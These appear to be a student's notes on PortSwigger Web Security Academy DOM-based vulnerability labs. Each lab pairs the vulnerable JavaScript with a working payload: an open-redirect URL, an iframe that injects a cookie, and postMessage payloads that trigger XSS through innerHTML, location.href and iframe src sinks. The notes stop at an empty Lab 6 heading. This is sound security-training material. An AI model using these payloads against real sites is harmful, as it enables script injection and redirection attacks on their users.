## Lab - 1: DOM-based open redirection

- This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

- Vulnerable script may be at `/post?postId=1` page

```html
<a
  href="#"
  onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'
  >Back to Blog</a
>
```

```
https://0a6a008d033583b9c00962fb00c600c1.web-security-academy.net/post?postId=1&url=https://exploit-server.com#
```

---

## Lab - 2: DOM-based cookie manipulation

- This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.

- Vulnerable script may be at `/post?postId=1` page

```html
<script>
  document.cookie =
    "lastViewedProduct=" + window.location + "; SameSite=None; Secure";
</script>
```

In the exploit server body,

```html
<iframe
  src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>"
  onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;"
></iframe>
```

---

## Lab - 3: DOM XSS using web messages

- Vuln JS script that was found

```html
<script>
  window.addEventListener("message", function (e) {
    document.getElementById("ads").innerHTML = e.data;
  });
</script>
```

- In exploit server body,

```html
<iframe
  src="https://0afd00cd0391a181c0cd832300ce0055.web-security-academy.net/"
  onload="this.contentWindow.postMessage('<img src=x onerror=print()>', '*')"
></iframe>
```

---

## Lab - 4: DOM XSS using web messages and a JavaScript URL

- Vulns JS script that was found

```html
<script>
  window.addEventListener(
    "message",
    function (e) {
      var url = e.data;
      if (url.indexOf("http:") > -1 || url.indexOf("https:") > -1) {
        location.href = url; // sink
      }
    },
    false
  );
</script>
```

- In exploit server body

```html
<iframe
  src="https://0a4b0006031a9db0c0a30b33006c005f.web-security-academy.net/"
  onload="this.contentWindow.postMessage('javascript:print()//http:', '*')"
></iframe>
```

---

## Lab - 5: DOM XSS using web messages and JSON.parse

- Vulns JS script

```html
<script>
  window.addEventListener(
    "message",
    function (e) {
      var iframe = document.createElement("iframe"),
        ACMEplayer = { element: iframe },
        d;
      document.body.appendChild(iframe);
      try {
        d = JSON.parse(e.data); //JSON object
      } catch (e) {
        return;
      }
      switch (d.type) {
        case "page-load":
          ACMEplayer.element.scrollIntoView();
          break;
        case "load-channel":
          ACMEplayer.element.src = d.url; // sink
          break;
        case "player-height-changed":
          ACMEplayer.element.style.width = d.width + "px";
          ACMEplayer.element.style.height = d.height + "px";
          break;
      }
    },
    false
  );
</script>
```

- In exploit server body,

```html
<iframe
  src="https://0a9400be04e7f017c06750dc00650083.web-security-academy.net/"
  onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'
></iframe>
```

---

## Lab - 6: Exploiting DOM clobbering to enable XSS
